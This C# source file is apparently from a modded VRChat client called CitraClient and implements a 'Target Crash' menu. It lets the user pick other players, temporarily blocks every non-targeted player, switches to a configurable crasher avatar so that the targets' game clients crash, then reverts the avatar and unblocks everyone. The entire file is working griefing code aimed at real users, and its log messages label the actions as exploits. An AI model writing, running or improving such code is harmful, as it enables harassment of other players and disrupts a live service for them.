using System.Collections;
using System.Collections.Generic;
using CitraClient.API.QM;
using CitraClient.Config;
using CitraClient.GUI.QM.Console;
using CitraClient.Utils;
using CitraClient.Utils.UI;
using Il2CppSystem.Collections.Generic;
using UnityEngine;
using UnityEngine.UI;
using VRC;
using VRC.Core;
using VRC.UI;

namespace CitraClient.GUI.QM
{
	public static class TargetCrashMenu
	{
		public static QMNestedButton targetCrashMenu;

		private static readonly System.Collections.Generic.List<string> TARGETS = new System.Collections.Generic.List<string>();

		private static string PreviousAvatar { get; set; }

		public static void InitTargetCrashMenu()
		{
			int x = 0;
			int y = 5;
			targetCrashMenu = new QMNestedButton(MainMenu.MainPage, "Target Crash", 3f, 3f, "Select Target's to attempt to crash..", "<color=#CE389C>Citra:</color> <color=#00d1ed>Multi Crash</color>");
			QMScrollMenu playerScrollMenu = new QMScrollMenu(targetCrashMenu, string.Empty, 1, 0, delegate
			{
			}, string.Empty, string.Empty);
			playerScrollMenu.SetAction(delegate
			{
				Il2CppSystem.Collections.Generic.List<Player> allPlayersToList = PlayerUtils.GetAllPlayersToList();
				Il2CppSystem.Collections.Generic.List<Player>.Enumerator enumerator = allPlayersToList.GetEnumerator();
				while (enumerator.MoveNext())
				{
					Player player = enumerator.Current;
					playerScrollMenu.Add(new QMSingleButton(targetCrashMenu, x, y, CheckForText(player), delegate
					{
						if (player == null)
						{
							ConsoleUtils.OnLogWarn("Selected Player is null and cannot be selected.");
							MezLogger.HudWarn("Selected Player is null and cannot be selected.", 5f);
						}
						else
						{
							if (!TARGETS.Contains(player.prop_APIUser_0.id))
							{
								TARGETS.Add(player.prop_APIUser_0.id);
							}
							CenterConsole.Log(CenterConsole.LogsType.EXPLOIT, "Added " + player.prop_APIUser_0.displayName + " to the Crash List.");
						}
					}, "Press to add " + player.prop_APIUser_0.displayName + " to the Crash List"));
				}
			});
			new QMSingleButton(targetCrashMenu, 4f, 0.12f, "CLAP", delegate
			{
				if (TARGETS.Count == 0)
				{
					MezLogger.HudError("No Users Selected!", 5f);
				}
				else
				{
					TargetCrash(Configuration.GetConfig().AvatarID, 5).Start();
				}
			}, "Crash All current users added to Target List.", null, halfBtn: true);
			new QMSingleButton(targetCrashMenu, 4f, 3f, "CLEAR", delegate
			{
				if (TARGETS.Count == 0)
				{
					CenterConsole.Log(CenterConsole.LogsType.EXPLOIT, "The Target Crash List is currently empty!");
				}
				else
				{
					int count = TARGETS.Count;
					TARGETS.Clear();
					int count2 = TARGETS.Count;
					int num = count2 + count;
					CenterConsole.Log(CenterConsole.LogsType.EXPLOIT, $"Cleared [{num}] players from the Crash List.");
				}
			}, "Clear All current users added to Target List.", null, halfBtn: true);
			new QMSingleButton(targetCrashMenu, 4f, 3.5f, "Avatar ID", delegate
			{
				VRCUiPopupManager.prop_VRCUiPopupManager_0.ShowInputPopupWithCancel("Please enter avatar ID", string.Empty, InputField.InputType.Standard, useNumericKeypad: false, "Save", delegate(string s, Il2CppSystem.Collections.Generic.List<KeyCode> k, Text t)
				{
					if (Configuration.GetConfig().AvatarID != null)
					{
						Configuration.GetConfig().AvatarID = Configuration.GetConfig().AvatarID.Replace(Configuration.GetConfig().AvatarID, s);
					}
					Configuration.GetConfig().AvatarID = s;
					Configuration.Save();
				}, Popups.HideCurrentPopup);
			}, "Add custom avatar id to use for the Crasher.", null, halfBtn: true);
		}

		private static void ChangeToCrash(string avatarID, int secondsToWait)
		{
			if (avatarID == null)
			{
				MezLogger.HudWarn("No avatar ID is currently set!", 7.5f);
				return;
			}
			PreviousAvatar = VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_ApiAvatar_0.id;
			ChangeAvatar(avatarID);
			WaitSeconds().Start();
			IEnumerator WaitSeconds()
			{
				yield return new WaitForSeconds(secondsToWait);
				CenterConsole.Log(CenterConsole.LogsType.EXPLOIT, $"Spent <color=red>[{secondsToWait}] seconds</color> in a crasher.");
				while (VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_ApiAvatar_0.id != PreviousAvatar)
				{
					ChangeAvatar(PreviousAvatar);
					yield return new WaitForSeconds(0.5f);
				}
			}
		}

		private static IEnumerator TargetCrash(string avatarID, int secondsToWait)
		{
			DisableEnableLocalPlayer(state: true);
			for (int i = 0; i < PlayerUtils.GetPlayerManager().GetAllPlayers().Length; i++)
			{
				Player player = PlayerUtils.GetPlayerManager().GetAllPlayers()[i];
				PageUserInfo userinfo = GameObject.Find("Screens").transform.Find("UserInfo").GetComponent<PageUserInfo>();
				userinfo.field_Private_APIUser_0 = new APIUser
				{
					id = player.prop_APIUser_0.id
				};
				if (!PlayerUtils.IsBlockedEitherWay(userinfo.field_Private_APIUser_0.id) && userinfo.field_Private_APIUser_0.id != APIUser.CurrentUser.id && !TARGETS.Contains(userinfo.field_Private_APIUser_0.id))
				{
					userinfo.ToggleBlock();
					yield return new WaitForSeconds(0.5f);
				}
			}
			yield return new WaitForSeconds(5f);
			PreviousAvatar = VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_ApiAvatar_0.id;
			ChangeToCrash(avatarID, secondsToWait);
			yield return new WaitForSeconds((float)secondsToWait + 3f);
			CenterConsole.Log(CenterConsole.LogsType.EXPLOIT, "Unblocking players...");
			for (int j = 0; j < PlayerUtils.GetPlayerManager().GetAllPlayers().Length; j++)
			{
				Player player2 = PlayerUtils.GetPlayerManager().GetAllPlayers()[j];
				PageUserInfo userinfo2 = GameObject.Find("Screens").transform.Find("UserInfo").GetComponent<PageUserInfo>();
				userinfo2.field_Private_APIUser_0 = new APIUser
				{
					id = player2.prop_APIUser_0.id
				};
				if (PlayerUtils.IsBlockedEitherWay(userinfo2.field_Private_APIUser_0.id) && userinfo2.field_Private_APIUser_0.id != APIUser.CurrentUser.id && !TARGETS.Contains(userinfo2.field_Private_APIUser_0.id))
				{
					userinfo2.ToggleBlock();
				}
			}
			DisableEnableLocalPlayer(state: false);
			PlayerUtils.ReloadAvatar(PlayerUtils.GetLocalPlayer());
			TARGETS.Clear();
		}

		private static void ChangeAvatar(string avatarID)
		{
			PageAvatar component = GameObject.Find("Screens").transform.Find("Avatar").GetComponent<PageAvatar>();
			component.field_Public_SimpleAvatarPedestal_0.field_Internal_ApiAvatar_0 = new ApiAvatar
			{
				id = avatarID
			};
			component.ChangeToSelectedAvatar();
		}

		private static string CheckForText(Player player)
		{
			string text = null;
			if (player == null)
			{
				return null;
			}
			if (TARGETS.Contains(player.prop_APIUser_0.id))
			{
				text = player.prop_APIUser_0.displayName + "\n<color=red>[TARGET]</color>";
			}
			return (!TARGETS.Contains(player.prop_APIUser_0.id)) ? player.prop_APIUser_0.displayName : text;
		}

		public static void DisableEnableLocalPlayer(bool state)
		{
			if (state)
			{
				GameObject gameObject = PlayerUtils.GetLocalPlayer().transform.Find("ForwardDirection").gameObject;
				if (gameObject != null)
				{
					gameObject.SetActive(value: false);
				}
			}
			else
			{
				GameObject gameObject2 = PlayerUtils.GetLocalPlayer().transform.Find("ForwardDirection").gameObject;
				if (gameObject2 != null)
				{
					gameObject2.SetActive(value: true);
				}
			}
		}
	}
}
